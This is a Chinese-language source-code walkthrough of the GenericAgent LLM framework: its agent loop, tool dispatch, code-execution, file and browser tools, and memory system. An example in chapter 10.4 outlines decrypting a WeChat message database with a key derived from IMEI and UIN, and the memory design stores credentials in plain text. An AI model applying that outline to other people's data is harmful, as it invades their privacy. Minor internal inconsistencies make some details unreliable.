# GenericAgent 源码深度解读

## 从 3000 行代码理解智能体的工作原理

---

> **本书定位**：以 GenericAgent 开源项目为蓝本，从源码层面系统性地讲解一个 LLM 智能体是如何工作的。不依赖任何抽象概念，每一章都对应真实代码。
>
> **源码版本**：GitHub `lsdefine/GenericAgent`，commit `639da67`（2026-04）
>
> **核心代码量**：约 3000 行 Python，9 个原子工具，1 个约 100 行的 Agent Loop。

---

## 目录

- [第一章　什么是智能体](#第一章什么是智能体)
- [第二章　GenericAgent 的整体架构](#第二章genericagent-的整体架构)
- [第三章　Agent Loop —— 智能体的心跳](#第三章agent-loop--智能体的心跳)
- [第四章　工具注册 —— 告诉模型"你能做什么"](#第四章工具注册--告诉模型你能做什么)
- [第五章　工具分发 —— 从 JSON 到真实操作](#第五章工具分发--从-json-到真实操作)
- [第六章　核心工具详解：代码执行](#第六章核心工具详解代码执行)
- [第七章　核心工具详解：文件操作](#第七章核心工具详解文件操作)
- [第八章　核心工具详解：浏览器控制](#第八章核心工具详解浏览器控制)
- [第九章　记忆系统 —— 智能体的"长期大脑"](#第九章记忆系统--智能体的长期大脑)
- [第十章　自进化机制 —— 技能树的生长](#第十章自进化机制--技能树的生长)
- [第十一章　多模型适配 —— 一套代码驱动所有 LLM](#第十一章多模型适配--一套代码驱动所有-llm)
- [第十二章　安全边界与防御机制](#第十二章安全边界与防御机制)
- [第十三章　与其他 Agent 框架的对比](#第十三章与其他-agent-框架的对比)
- [第十四章　从零复现一个最小 Agent](#第十四章从零复现一个最小-agent)
- [附录 A　完整数据流追踪](#附录-a完整数据流追踪)
- [附录 B　关键源码索引](#附录-b关键源码索引)

---

## 第一章　什么是智能体

### 1.1 从聊天机器人到智能体

传统的大模型对话是这样的：

```
用户 → [大模型 API] → 回答（纯文本）
```

模型只能输出文字，不能做任何事情。它说"我帮你创建了一个文件"，但实际上什么都没发生。

**智能体（Agent）** 在此基础上加了一个关键能力：**行动**。

```
用户 → [大模型 API] → 输出"我要调用 file_write 工具"
                         ↓
                    [本地代码解析]
                         ↓
                    [open("hello.py", "w").write(...)]
                         ↓
                    [文件真的被创建了]
                         ↓
                    把结果告诉模型 → 模型继续推理
```

### 1.2 智能体的本质公式

```
智能体 = 大模型（决策） + 工具（行动） + 循环（持续运行）
```

这三个要素缺一不可：

| 要素 | 作用 | GenericAgent 中的对应 |
|------|------|---------------------|
| 大模型 | 决定"做什么" | Claude / Gemini / Kimi 等 LLM API |
| 工具 | 实现"怎么做" | 9 个原子工具（code_run, file_write 等） |
| 循环 | 保持"持续做" | `agent_runner_loop` 的 while 循环 |

### 1.3 为什么 GenericAgent 只有 3000 行

大多数 Agent 框架（LangChain、AutoGPT）动辄上万行代码，因为它们预置了大量"技能"——写邮件的模板、查天气的封装、数据库连接器……

GenericAgent 的设计哲学不同：**不预置技能，让模型自己进化技能**。

它只提供：
- 一个循环引擎（~100 行）
- 一组原子工具（~800 行 handler）
- 一个记忆系统（~200 行）
- 一个浏览器控制器（~500 行）

其余的，全部交给模型用 `code_run` 自己写代码解决。

---

## 第二章　GenericAgent 的整体架构

### 2.1 文件结构

```
GenericAgent/
├── agent_loop.py          # Agent Loop：循环调度引擎（~100行核心）
├── agentmain.py           # 主入口：GenericAgent 类，会话管理
├── ga.py                  # Handler：9个工具的具体实现
├── TMWebDriver.py         # 浏览器注入控制器（CDP协议）
├── llmcore/               # LLM API 封装层
│   ├── claude_session.py  # Claude API 适配
│   ├── openai_session.py  # OpenAI 兼容 API 适配
│   └── mixin_session.py   # 混合模型路由
├── assets/
│   ├── tools_schema.json  # 工具定义（告诉模型有什么工具）
│   ├── sys_prompt.txt     # 系统提示词
│   ├── code_run_header.py # 代码执行时注入的安全头
│   └── simphtml.py        # HTML 简化器
└── memory/                # 记忆存储目录
    ├── global_mem.txt     # L2 长期记忆
    └── global_mem_insight.txt  # 记忆索引
```

### 2.2 四层架构

```
┌─────────────────────────────────────────────────────────┐
│                    第四层：用户界面                        │
│     agentmain.py — 任务队列、会话管理、CLI/Web 界面        │
├─────────────────────────────────────────────────────────┤
│                    第三层：循环引擎                        │
│     agent_loop.py — while 循环、tool_calls 解析、结果拼接  │
├─────────────────────────────────────────────────────────┤
│                    第二层：工具实现                        │
│     ga.py — do_code_run / do_file_write / do_web_scan   │
├─────────────────────────────────────────────────────────┤
│                    第一层：操作系统                        │
│     subprocess / open() / CDP 协议 / 键盘鼠标             │
└─────────────────────────────────────────────────────────┘
```

数据从上往下流：用户的请求经过会话管理进入循环引擎，循环引擎调用 LLM 拿到 tool_calls，分发给工具层，工具层调用操作系统 API 真正执行。

结果从下往上流：执行结果返回给工具层，工具层包装成 StepOutcome，循环引擎把它拼入 messages 发回 LLM。

### 2.3 核心类关系

```
GenericAgent (agentmain.py)
  ├── llmclient: ToolClient          # LLM API 客户端
  ├── handler: GenericAgentHandler    # 工具处理器
  └── task_queue: Queue               # 任务队列

GenericAgentHandler (ga.py)  继承  BaseHandler (agent_loop.py)
  ├── do_code_run()                   # 执行代码
  ├── do_file_read()                  # 读文件
  ├── do_file_write()                 # 写文件
  ├── do_file_patch()                 # 精确修改文件
  ├── do_web_scan()                   # 扫描网页
  ├── do_web_execute_js()             # 执行浏览器 JS
  ├── do_ask_user()                   # 询问用户
  ├── do_update_working_checkpoint()  # 更新短期记忆
  └── do_start_long_term_update()     # 提炼长期记忆
```

---

## 第三章　Agent Loop —— 智能体的心跳

### 3.1 为什么需要循环

大模型 API 是**无状态的单次调用**——你发一个请求，它返回一个回答，结束。

但现实任务是**多步骤的**。比如"帮我写一个爬虫并部署到服务器"：

1. 需要先了解服务器环境（调用 `code_run` 执行 `uname -a`）
2. 根据环境写代码（调用 `file_write`）
3. 安装依赖（调用 `code_run` 执行 `pip install`）
4. 运行测试（调用 `code_run`）
5. 如果失败，分析错误，修改代码，重试

每一步都需要模型看到上一步的结果才能决定下一步。这就是**循环**的必要性。

### 3.2 `agent_runner_loop` 源码逐行解析

这是整个框架最核心的函数，位于 `agent_loop.py`：

```python
def agent_runner_loop(client, system_prompt, user_input, handler,
                      tools_schema, max_turns=40, verbose=True):
```

**参数含义**：

| 参数 | 类型 | 含义 |
|------|------|------|
| `client` | ToolClient | LLM API 封装，负责发 HTTP 请求 |
| `system_prompt` | str | 系统提示词，定义模型的角色和行为规则 |
| `user_input` | str | 用户的原始输入 |
| `handler` | GenericAgentHandler | 工具执行器，包含所有 do_xxx 方法 |
| `tools_schema` | list[dict] | 工具定义 JSON，传给模型的 tools 参数 |
| `max_turns` | int | 最大循环轮数，防止无限循环 |

#### 第一步：初始化消息

```python
messages = [
    {"role": "system", "content": system_prompt},
    {"role": "user", "content": user_input}
]
```

这是发给 LLM API 的第一帧。模型看到系统提示词（定义了它的角色是"物理级全能执行者"）和用户请求。

#### 第二步：进入循环

```python
turn = 0
while turn < max_turns:
    turn += 1
    yield f"\n\n**LLM Running (Turn {turn}) ...**\n\n"
```

`yield` 是关键——这个函数是**生成器**，每一步都会 yield 出中间结果，让上层（UI）可以实时显示进度。

#### 第三步：调用 LLM API

```python
    response_gen = client.chat(messages=messages, tools=tools_schema)
    response = yield from response_gen
```

`client.chat()` 也是一个生成器（因为 LLM API 是流式返回的）。`yield from` 把流式 token 逐个传给上层显示。

返回的 `response` 对象结构：
```python
response.content       # 模型的文本回复（可能包含思考过程）
response.tool_calls    # 模型要调用的工具列表
response.thinking      # 模型的内部思考（如果模型支持）
```

#### 第四步：解析 tool_calls

```python
    if not response.tool_calls:
        tool_calls = [{'tool_name': 'no_tool', 'args': {}}]
    else:
        tool_calls = [
            {'tool_name': tc.function.name,
             'args': json.loads(tc.function.arguments),
             'id': tc.id}
            for tc in response.tool_calls
        ]
```

如果模型没有调用任何工具（纯文本回复），系统会自动插入一个 `no_tool` 哨兵值。这样后续逻辑统一处理。

#### 第五步：逐个执行工具

```python
    tool_results = []
    for ii, tc in enumerate(tool_calls):
        tool_name, args, tid = tc['tool_name'], tc['args'], tc.get('id', '')

        # 分发到 handler 的 do_xxx 方法
        gen = handler.dispatch(tool_name, args, response, index=ii)
        outcome = yield from gen  # 执行并 yield 中间输出

        # 收集结果
        if outcome.data is not None:
            tool_results.append({'tool_use_id': tid, 'content': datastr})
```

`handler.dispatch` 返回的也是生成器——工具执行过程中会产生日志输出（如"正在执行 Python..."），这些通过 yield 实时显示。

#### 第六步：检查是否结束

```python
        if outcome.should_exit:
            break  # 工具要求退出（如 ask_user 中断了任务）
        if not outcome.next_prompt:
            break  # 没有下一步提示，任务完成
```

两种结束条件：
- `should_exit=True`：工具明确要求退出（如用户被询问后取消了任务）
- `next_prompt=None`：没有下一步指令，模型认为任务已完成

#### 第七步：拼接下一轮输入

```python
    next_prompt = handler.turn_end_callback(response, tool_calls,
                                             tool_results, turn, ...)
    messages = [{"role": "user", "content": next_prompt,
                 "tool_results": tool_results}]
```

把工具执行结果包装成新的 user message，发回给模型，开始下一轮循环。

### 3.3 `StepOutcome` —— 工具的返回协议

每个工具执行完后，必须返回一个 `StepOutcome` 对象：

```python
@dataclass
class StepOutcome:
    data: Any                          # 返回给模型的数据
    next_prompt: Optional[str] = None  # 下一轮的提示（None=任务结束）
    should_exit: bool = False          # 是否强制退出
```

| next_prompt | should_exit | 含义 |
|-------------|-------------|------|
| `"some text"` | False | 继续循环，把 text 作为下一轮提示 |
| `None` | False | 任务完成，退出循环 |
| 任意 | True | 强制退出（如 ask_user 中断） |

### 3.4 为什么每 10 轮重置工具描述

```python
if turn % 10 == 0:
    client.last_tools = ''
```

这是一个优化：工具的完整 schema（JSON 格式）每轮都会发给模型，占用大量 token。每 10 轮重置一次，让模型重新加载工具描述，避免上下文窗口被撑满导致性能下降。

---

## 第四章　工具注册 —— 告诉模型"你能做什么"

### 4.1 工具的本质：JSON Schema

大模型 API 的 `tools` 参数就是一个 JSON Schema 数组。GenericAgent 的 `tools_schema.json` 定义了所有可用工具：

```json
[
  {
    "type": "function",
    "function": {
      "name": "code_run",
      "description": "Code executor. Prefer python.",
      "parameters": {
        "type": "object",
        "properties": {
          "script": {"type": "string", "description": "代码内容"},
          "type": {"type": "string", "enum": ["python", "powershell"]},
          "timeout": {"type": "integer", "default": 60}
        }
      }
    }
  }
]
```

这个 JSON 会被原样传给 LLM API。模型在训练时见过大量这样的 schema，所以它知道：
- 有一个叫 `code_run` 的工具
- 它接受 `script`（字符串）、`type`（枚举）、`timeout`（整数）参数
- 描述说"优先用 python"

### 4.2 模型如何理解工具

这不是靠提示词"说服"模型的，而是**训练阶段对齐**的结果。

在模型的训练数据中，有海量的这样的对话样本：

```
[系统] 你有以下工具：file_write(path, content)
[用户] 帮我创建一个 hello.py
[助手] <tool_use name="file_write">
         <input>{"path":"hello.py","content":"print('hello')"}</input>
       </tool_use>
[系统] <tool_result>文件创建成功</tool_result>
[助手] 已经为你创建了 hello.py 文件。
```

通过数十万这样的样本，模型学会了：
1. 看到 tools schema → 知道有哪些工具
2. 用户的意图 → 应该调用哪个工具
3. 参数怎么填 → 参照 schema 中的 properties
4. 看到执行结果 → 继续推理或回复用户

### 4.3 GenericAgent 的 9 个原子工具

| # | 工具名 | 参数 | 作用 |
|---|--------|------|------|
| 1 | `code_run` | script, type, timeout, cwd | 执行 Python/Bash 代码 |
| 2 | `file_read` | path, start, count, keyword | 读取文件内容 |
| 3 | `file_write` | path, content, mode | 创建/覆写/追加文件 |
| 4 | `file_patch` | path, old_content, new_content | 精确替换文件中的文本 |
| 5 | `web_scan` | tabs_only, switch_tab_id, text_only | 获取浏览器页面内容 |
| 6 | `web_execute_js` | script, save_to_file, switch_tab_id | 在浏览器中执行 JS |
| 7 | `update_working_checkpoint` | key_info, related_sop | 更新短期工作记忆 |
| 8 | `ask_user` | question, candidates | 中断任务，向用户提问 |
| 9 | `start_long_term_update` | 无参数 | 启动长期记忆提炼 |

注意 `no_tool` 不在 schema 中——它是引擎内部用的哨兵值，当模型没有调用任何工具时自动触发。

### 4.4 工具描述的措辞很重要

工具的 `description` 不只是文档，它直接影响模型的行为选择：

```json
{
  "name": "code_run",
  "description": "Code executor. Prefer python. Multi-call OK, use script param."
}
```

- **"Prefer python"**：引导模型优先用 Python 而不是 Bash
- **"Multi-call OK"**：告诉模型可以多次调用
- **"use script param"**：引导模型用 script 参数而不是在回复中放代码块

这些措辞是精心设计的**行为引导**。

---

## 第五章　工具分发 —— 从 JSON 到真实操作

### 5.1 `dispatch` 的反射机制

当模型返回 `tool_calls: [{name: "code_run", arguments: {...}}]` 后，GenericAgent 需要把这个 JSON 映射到真实的 Python 函数。

核心在 `BaseHandler.dispatch`：

```python
class BaseHandler:
    def dispatch(self, tool_name, args, response, index=0):
        method_name = f"do_{tool_name}"   # "code_run" → "do_code_run"
        if hasattr(self, method_name):
            args['_index'] = index
            # 前置回调
            prer = yield from self.tool_before_callback(tool_name, args, response)
            # 执行工具
            ret = yield from getattr(self, method_name)(args, response)
            # 后置回调
            _ = yield from self.tool_after_callback(tool_name, args, response, ret)
            return ret
```

这是 Python 的**反射机制**：用字符串 `"do_code_run"` 查找同名方法并调用。

为什么用反射而不是 if-else？

```python
# 不好的写法（硬编码）
if tool_name == "code_run":
    return self.do_code_run(args)
elif tool_name == "file_read":
    return self.do_file_read(args)
elif ...  # 每加一个工具就要改这里

# 好的写法（反射）
method = getattr(self, f"do_{tool_name}")
return method(args)  # 自动映射，无需修改分发逻辑
```

### 5.2 工具执行的生命周期

```
dispatch("code_run", args)
    │
    ├── tool_before_callback()    # 前置钩子（可选）
    │
    ├── do_code_run(args)         # 实际执行
    │   ├── yield "[Action] Running python..."   # 日志
    │   ├── subprocess.Popen(cmd)                # 系统调用
    │   ├── yield "[Status] ✅ Exit Code: 0"     # 结果日志
    │   └── return StepOutcome(data, next_prompt)
    │
    ├── tool_after_callback()     # 后置钩子（可选）
    │
    └── return StepOutcome        # 返回给 agent_loop
```

### 5.3 未知工具的处理

如果模型返回了一个不存在的工具名（模型幻觉）：

```python
else:
    yield f"未知工具: {tool_name}\n"
    return StepOutcome(None, next_prompt=f"未知工具 {tool_name}", should_exit=False)
```

返回一个错误提示，让模型在下一轮知道这个工具不存在。同时：

```python
if outcome.next_prompt.startswith('未知工具'):
    client.last_tools = ''  # 重置工具描述，让模型重新学习
```

---

## 第六章　核心工具详解：代码执行

### 6.1 `do_code_run` —— 最强大的工具

代码执行是 GenericAgent 最核心的能力。通过它，模型可以做**任何事情**：安装包、写脚本、操作系统、发网络请求……

```python
def do_code_run(self, args, response):
    code_type = args.get("type", "python")
    code = args.get("code") or args.get("script")

    # 如果没有 code 参数，从模型回复的代码块中提取
    if not code:
        code = self._extract_code_block(response, code_type)

    timeout = int(args.get("timeout", 60))
    cwd = os.path.normpath(os.path.join(self.cwd, args.get("cwd", "./')))

    result = yield from code_run(code, code_type, timeout, cwd,
                                  code_cwd=self.cwd,
                                  stop_signal=self.code_stop_signal)
    return StepOutcome(result, next_prompt=self._get_anchor_prompt())
```

关键设计：

1. **代码来源灵活**：可以从 `script` 参数来，也可以从模型回复中的 ` ```python ``` ` 代码块来
2. **工作目录可控**：`cwd` 参数决定代码在哪个目录执行
3. **超时保护**：默认 60 秒，防止死循环
4. **可中断**：`stop_signal` 允许用户中止正在执行的代码

### 6.2 `code_run` 函数的执行流程

```python
def code_run(code, code_type="python", timeout=60, cwd=None, ...):
    if code_type == "python":
        # 1. 写入临时文件
        tmp_file = tempfile.NamedTemporaryFile(suffix=".ai.py", delete=False)
        tmp_file.write(open('assets/code_run_header.py').read())  # 注入安全头
        tmp_file.write(code)                                       # 写入模型生成的代码
        tmp_path = tmp_file.name

        # 2. 构造命令
        cmd = [sys.executable, "-X", "utf8", "-u", tmp_path]

    elif code_type == "bash":
        cmd = ["bash", "-c", code]

    # 3. 启动子进程
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    # 4. 实时读取输出
    def stream_reader(proc, logs):
        for line_bytes in iter(proc.stdout.readline, b''):
            line = line_bytes.decode('utf-8')
            logs.append(line)
            print(line, end="")  # 实时打印

    t = threading.Thread(target=stream_reader, args=(process, full_stdout))
    t.start()

    # 5. 等待完成或超时
    while t.is_alive():
        if time.time() - start_t > timeout:
            process.kill()  # 超时强杀
            break
        time.sleep(1)

    # 6. 返回结果
    return {"status": "success" if exit_code == 0 else "error",
            "stdout": stdout_str, "exit_code": exit_code}
```

### 6.3 `code_run_header.py` —— 注入的安全适配层

每次执行 Python 代码前，会先注入这段代码：

```python
import sys, os, json, re, time, subprocess

# 包装 subprocess.run，统一编码处理
_r = subprocess.run
def _run(*a, **k):
    t = k.pop('text', 0) | k.pop('universal_newlines', 0)
    enc = k.pop('encoding', None)
    if enc: t = 1
    if t and isinstance(k.get('input'), str):
        k['input'] = k['input'].encode()  # 统一编码
    r = _r(*a, **k)
    if t:
        if r.stdout is not None: r.stdout = _d(r.stdout)
        if r.stderr is not None: r.stderr = _d(r.stderr)
    return r
subprocess.run = _run  # 替换全局 subprocess.run

# Windows 下隐藏子进程窗口
_Pi = subprocess.Popen.__init__
def _pinit(self, *a, **k):
    if os.name == 'nt':
        k['creationflags'] = (k.get('creationflags') or 0) | 0x08000000
    _Pi(self, *a, **k)
subprocess.Popen.__init__ = _pinit

# 错误提示：不要猜测，先探测
sys.excepthook = lambda t, v, tb: ...  # ImportError 时提示 pip install
```

这段代码的作用：
1. **编码适配**：Windows/Linux 的默认编码不同，统一为 UTF-8
2. **窗口隐藏**：Windows 下子进程不弹出黑窗口
3. **错误引导**：ImportError 时提示模型先安装包，不要猜测

### 6.4 代码执行的两种模式

| 模式 | 用法 | 场景 |
|------|------|------|
| 文件模式 | `code_run(type="python", script="...")` | 复杂脚本，写入 .py 文件执行 |
| 命令模式 | `code_run(type="bash", script="ls -la")` | 简单命令，直接 bash -c 执行 |

模型会根据任务复杂度自行选择。通用规则是：能用一行 bash 解决的不用 Python，需要逻辑的用 Python。

---

## 第七章　核心工具详解：文件操作

### 7.1 三种文件工具的分工

```
file_read   → 只读，用于了解当前状态
file_write  → 大面积写入，创建新文件或完全重写
file_patch  → 精确替换，修改文件中的某一段
```

这是工程上的最佳实践：
- **先读后写**：修改文件前先 `file_read` 确认当前内容和行号
- **小改用 patch**：只替换变化的部分，避免覆盖其他内容
- **大改用 write**：整个文件重写

### 7.2 `file_read` —— 智能读取

```python
def file_read(path, start=1, keyword=None, count=200, show_linenos=True):
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        stream = ((i, l.rstrip('\r\n')) for i, l in enumerate(f, 1))
        stream = itertools.dropwhile(lambda x: x[0] < start, stream)

        if keyword:
            # 关键词搜索模式：返回关键词所在行及上下文
            before = collections.deque(maxlen=count//3)
            for i, l in stream:
                if keyword.lower() in l.lower():
                    res = list(before) + [(i, l)] +
                          list(itertools.islice(stream, count - len(before) - 1))
                    break
                before.append((i, l))
        else:
            # 普通模式：从 start 行开始读 count 行
            res = list(itertools.islice(stream, count))
```

特色功能：
- **关键词搜索**：`file_read(path, keyword="error")` 会找到第一个包含 "error" 的行及其上下文
- **行号显示**：返回格式为 `行号|内容`，方便后续 `file_patch` 时定位
- **文件模糊匹配**：如果文件不存在，会扫描目录找相似文件名

```python
# 文件不存在时的模糊匹配
if not os.path.isfile(path):
    tgt = os.path.basename(path)
    cands = list(_scan_files(os.path.dirname(os.path.dirname(path))))
    top = sorted([(difflib.SequenceMatcher(None, tgt.lower(), c[0].lower()).ratio(), c)
                   for c in cands], key=lambda x: -x[0])[:5]
    # 返回 "Did you mean: xxx.py (85%)"
```

### 7.3 `file_patch` —— 精确手术

```python
def file_patch(path, old_content, new_content):
    with open(path, 'r', encoding='utf-8') as f:
        full_text = f.read()

    count = full_text.count(old_content)
    if count == 0:
        return {"status": "error", "msg": "未找到匹配的旧文本块"}
    if count > 1:
        return {"status": "error", "msg": f"找到 {count} 处匹配，无法确定唯一位置"}

    updated_text = full_text.replace(old_content, new_content)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(updated_text)
```

关键约束：
- `old_content` 必须**唯一匹配**——如果有多处相同文本，会拒绝执行并要求更精确的定位
- 这避免了误替换的风险

### 7.4 `file_write` —— 三种写入模式

```python
def do_file_write(self, args, response):
    path = self._get_abs_path(args.get("path"))
    mode = args.get("mode", "overwrite")  # overwrite / append / prepend

    # 从模型回复中提取内容
    content = args.get('content') or extract_robust_content(response.content)

    if mode == "prepend":
        old = open(path, 'r').read() if os.path.exists(path) else ""
        open(path, 'w').write(content + old)
    elif mode == "append":
        with open(path, 'a') as f: f.write(content)
    else:  # overwrite
        with open(path, 'w') as f: f.write(content)
```

内容提取的鲁棒性设计：

```python
def extract_robust_content(text):
    # 方法1：从 <file_content> 标签提取
    tags = re.findall(r"<file_content[^>]*>(.*?)</file_content>", text, re.DOTALL)
    if tags: return tags[-1].strip()

    # 方法2：从代码块提取
    blocks = re.findall(r"```[^\n]*\n([\s\S]*?)```", text)
    if blocks: return blocks[-1].strip()

    return None
```

模型可以把要写入的内容放在 `<file_content>` 标签或代码块中，系统都能提取。

### 7.5 `expand_file_refs` —— 文件引用展开

```python
def expand_file_refs(text, base_dir=None):
    """展开 {{file:path:start:end}} 引用为实际文件内容"""
    pattern = r'\{\{file:(.+?):(\d+):(\d+)\}\}'
    def replacer(match):
        path, start, end = match.group(1), int(match.group(2)), int(match.group(3))
        with open(path, 'r') as f: lines = f.readlines()
        return ''.join(lines[start-1:end])
    return re.sub(pattern, replacer, text)
```

允许模型在 `file_write` 的 content 中引用其他文件的片段：

```
{{file:./config.py:10:20}}
```

会自动展开为 `config.py` 第 10-20 行的内容。

---

## 第八章　核心工具详解：浏览器控制

### 8.1 为什么需要浏览器控制

很多任务需要操作网页：填表单、点击按钮、读取动态内容。GenericAgent 通过 Chrome DevTools Protocol (CDP) 直接控制浏览器。

### 8.2 `web_scan` —— 获取页面内容

```python
def web_scan(tabs_only=False, switch_tab_id=None, text_only=False):
    global driver
    if driver is None:
        first_init_driver()  # 首次调用时初始化 WebDriver

    # 获取所有标签页
    tabs = driver.get_all_sessions()

    if not tabs_only:
        # 获取当前页面的简化 HTML
        import simphtml
        result["content"] = simphtml.get_html(driver, cutlist=True,
                                                maxchars=35000, text_only=text_only)
    return result
```

`simphtml` 是一个 HTML 简化器，会：
- 移除隐藏元素、浮动元素、边栏等非主体内容
- 压缩冗余标签
- 保留关键文本和交互元素

### 8.3 `web_execute_js` —— 完全控制浏览器

```python
def web_execute_js(script, switch_tab_id=None, no_monitor=False):
    global driver
    if driver is None:
        first_init_driver()

    result = simphtml.execute_js_rich(script, driver, no_monitor=no_monitor)
    return result
```

这个工具让模型可以在浏览器中执行任意 JavaScript：
- 点击按钮：`document.querySelector('#submit').click()`
- 填写表单：`document.querySelector('#email').value = 'test@test.com'`
- 读取数据：`document.querySelector('.price').textContent`
- 导航页面：`window.location.href = 'https://...'`

### 8.4 浏览器控制的架构

```
GenericAgent
    │
    ├── web_execute_js(script)
    │       │
    │       ▼
    │   simphtml.execute_js_rich(script, driver)
    │       │
    │       ▼
    │   TMWebDriver (CDP 协议)
    │       │
    │       ▼
    │   Chrome 浏览器（已打开的实例）
    │       │
    │       ▼
    │   网页操作（点击、输入、读取）
```

TMWebDriver 通过 CDP 协议连接到已运行的 Chrome 实例，不需要 Selenium 或 WebDriver 二进制文件。

---

## 第九章　记忆系统 —— 智能体的"长期大脑"

### 9.1 三层记忆架构

GenericAgent 有三层记忆，模拟人类的记忆系统：

```
┌─────────────────────────────────────┐
│ L0: 工作记忆（Working Memory）       │
│ 内存中的字典，单次任务内有效           │
│ 存储：key_info, related_sop          │
├─────────────────────────────────────┤
│ L1: 会话历史（Session History）      │
│ LLM 的 messages 数组                 │
│ 存储：当前对话的完整上下文             │
├─────────────────────────────────────┤
│ L2: 长期记忆（Long-term Memory）     │
│ 文件系统中的 .txt 文件               │
│ 存储：跨会话的经验、环境信息、SOP      │
└─────────────────────────────────────┘
```

### 9.2 L0: 工作记忆 —— `update_working_checkpoint`

```python
def do_update_working_checkpoint(self, args, response):
    key_info = args.get("key_info", "")
    related_sop = args.get("related_sop", "")

    if "key_info" in args:
        self.working['key_info'] = key_info
    if "related_sop" in args:
        self.working['related_sop'] = related_sop
```

工作记忆存储在 `self.working` 字典中，**每轮都会注入到模型的提示词中**：

```python
def _get_anchor_prompt(self, skip=False):
    prompt = f"\n### [WORKING MEMORY]\n{earlier}<history>\n{h_str}\n</history>"
    if self.working.get('key_info'):
        prompt += f"\n<key_info>{self.working.get('key_info')}</key_info>"
    if self.working.get('related_sop'):
        prompt += f"\n有不清晰的地方请再次读取{self.working.get('related_sop')}"
    return prompt
```

这确保模型在长任务中不会"忘记"关键信息。

### 9.3 L1: 会话历史 —— 智能压缩

会话历史就是 LLM 的 `messages` 数组。但随着对话变长，token 消耗会暴涨。GenericAgent 的策略是：

```python
def _fold_earlier(self, lines):
    """把早期对话压缩成一行摘要"""
    parts, cnt, last = [], 0, ''
    for line in lines:
        if line.startswith('[USER]'):
            if cnt:
                if '直接回答了用户问题' in last:
                    parts.append(f'[Agent]（{cnt} turns）')
                else:
                    parts.append(f'{last}（{cnt} turns）')
            parts.append(line)
            cnt = 0
        else:
            cnt += 1
            last = line
    return "\n".join(parts[-150:])  # 最多保留最近 150 条
```

早期的对话被压缩成 `[Agent]（5 turns）` 这样的摘要，只保留最近 30 轮的完整内容。

### 9.4 L2: 长期记忆 —— 文件系统

长期记忆存储在 `memory/` 目录下的文本文件中：

```
memory/
├── global_mem.txt           # L2 全局记忆
├── global_mem_insight.txt   # 记忆索引/洞察
└── memory_management_sop.md # 记忆管理 SOP
```

当模型认为任务完成后有重要信息值得记住时，调用 `start_long_term_update`：

```python
def do_start_long_term_update(self, args, response):
    prompt = '''### [总结提炼经验]
    提取最近一次任务中【事实验证成功且长期有效】的：
    - 环境事实（路径/凭证/配置）→ 更新 L2
    - 复杂任务经验（关键坑点/前置条件）→ L3 精简 SOP
    '''
    # 返回记忆管理 SOP 给模型，让它按规则更新
    result = 'This is L0:\n' + file_read('./memory/memory_management_sop.md')
    return StepOutcome(result, next_prompt=prompt)
```

### 9.5 记忆如何跨会话保持

```python
# agentmain.py
def get_system_prompt():
    with open('assets/sys_prompt.txt') as f: prompt = f.read()
    prompt += f"\nToday: {time.strftime('%Y-%m-%d %a')}\n"
    prompt += get_global_memory()  # 把 L2 记忆注入系统提示词
    return prompt
```

每次新会话开始时，L2 记忆会被注入到系统提示词中。这样模型就能"记住"之前学到的东西。

---

## 第十章　自进化机制 —— 技能树的生长

### 10.1 核心理念：不预置技能，进化技能

传统 Agent 框架的做法：
```
用户说"查天气" → 框架内置 get_weather() 工具 → 调用天气 API
用户说"发邮件" → 框架内置 send_email() 工具 → 调用邮件 API
```

GenericAgent 的做法：
```
用户说"查天气" → 模型调用 code_run → 自己写代码调用天气 API
                → 成功后把代码保存为 skill
下次再说"查天气" → 直接调用已保存的 skill（一行命令）
```

### 10.2 技能进化的流程

```
新任务
  │
  ▼
自主探索（写脚本、调试、验证）
  │
  ▼
成功完成任务
  │
  ▼
自动结晶为 skill（保存到记忆系统）
  │
  ▼
下次类似任务直接复用
```

### 10.3 为什么这样设计更省 token

| 阶段 | Token 消耗 | 说明 |
|------|-----------|------|
| 首次执行 | 高（探索+调试+执行） | 可能需要 20+ 轮 |
| 后续执行 | 低（直接调用 skill） | 1-2 轮 |

GenericAgent 的论文标题就是：**"A Token-Efficient Self-Evolving LLM Agent via Contextual Information Density Maximization"**

核心思想：首次探索的高 token 消耗是一次性投资，后续复用时 token 消耗趋近于零。

### 10.4 记忆系统如何支持进化

```
首次任务："帮我读微信消息"
  │
  ├── 安装依赖：pip install pycryptodome
  ├── 写解密脚本：decrypt_wechat_db.py
  ├── 调试 5 次，最终成功
  │
  └── start_long_term_update()
       └── 写入 L2 记忆：
           "读微信消息的方法：
            1. 需要 pycryptodome
            2. 数据库路径: /data/data/com.tencent.mm/...
            3. 解密脚本: temp/decrypt_wechat_db.py
            4. 关键: key 从 IMEI + UIN 生成"

下次任务："读微信消息"
  │
  ├── 从 L2 记忆中读取方法
  ├── 直接执行 decrypt_wechat_db.py
  └── 1 轮完成
```

---

## 第十一章　多模型适配 —— 一套代码驱动所有 LLM

### 11.1 模型无关的设计

GenericAgent 支持 Claude、Gemini、Kimi、MiniMax 等多种模型，核心代码不需要修改。这是通过**抽象层**实现的。

```python
# agentmain.py
def load_llm_sessions(self):
    for k, cfg in mykeys.items():
        if 'mixin' in k:
            llm_sessions += [{'mixin_cfg': cfg}]
        elif c := resolve_client(k):
            llm_sessions += [c]

    # 所有 client 都被包装成统一接口
    for i, s in enumerate(llm_sessions):
        if isinstance(s, dict) and 'mixin_cfg' in s:
            mixin = MixinSession(llm_sessions, s['mixin_cfg'])
            if isinstance(mixin._sessions[0], (NativeClaudeSession, NativeOAISession)):
                llm_sessions[i] = NativeToolClient(mixin)
            else:
                llm_sessions[i] = ToolClient(mixin)
```

### 11.2 统一接口

不管底层是什么模型，对外暴露的接口都是：

```python
class ToolClient:
    def chat(self, messages, tools) -> Response:
        # messages: [{"role": "user", "content": "..."}]
        # tools: tools_schema.json 的内容
        # 返回: Response(content=..., tool_calls=[...])
        ...
```

每个模型的适配器负责：
1. 把 `tools` 转成该模型的格式
2. 把 API 返回转成统一的 `Response` 对象

### 11.3 不同模型的工具格式差异

| 模型 | 请求中的工具格式 | 返回的 tool_call 格式 |
|------|----------------|---------------------|
| OpenAI 兼容 | `tools: [{type: "function", ...}]` | `response.tool_calls[].function` |
| Claude 原生 | `tools: [{name, input_schema}]` | `content: [{type: "tool_use", id, name, input}]` |
| Gemini | `tools: [{function_declarations: [...]}]` | `response.candidates[].functionCall` |

GenericAgent 的适配层把这些差异全部屏蔽了。

